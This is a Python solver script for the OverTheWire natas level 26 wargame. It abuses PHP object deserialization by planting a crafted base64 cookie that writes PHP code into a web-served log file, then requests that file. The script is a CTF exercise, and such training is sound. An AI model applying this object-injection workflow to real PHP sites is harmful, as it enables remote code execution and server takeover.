"""
Help script to resolve natas challenge #26
"""
import requests
import json
import subprocess
import base64

level = 'natas26'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
In this level we will exploit an uncontrolled object deserialization.
"""
session = requests.Session()
session.get(url, auth=auth)
# The values of the object to be drawn are saved in a response cookie.
# The value is base64-encoded and looks somewhat like this when decoded
# a:1:{i:0;a:4:{s:2:"x1";s:1:"0";s:2:"y1";s:1:"0";s:2:"x2";s:1:"3";s:2:"y2";s:1:"3";}}
# We then create a modified PHP object (see natas26.php) which will inject php code into the log.
# We can modify the location of the written file too.
# The script natas26.php will serialize the modified object.
output = subprocess.check_output(['php', 'natas26.php'])
print('Object: ' + output.decode('utf-8'))
# Encode the serialized object and add it to the request cookie.
my_object = base64.b64encode(output).decode('utf-8')
session.cookies['drawing'] = my_object
response = session.get(url + '/img/natas26.php', auth=auth)  # Grab our malicious file.
print(response.text)
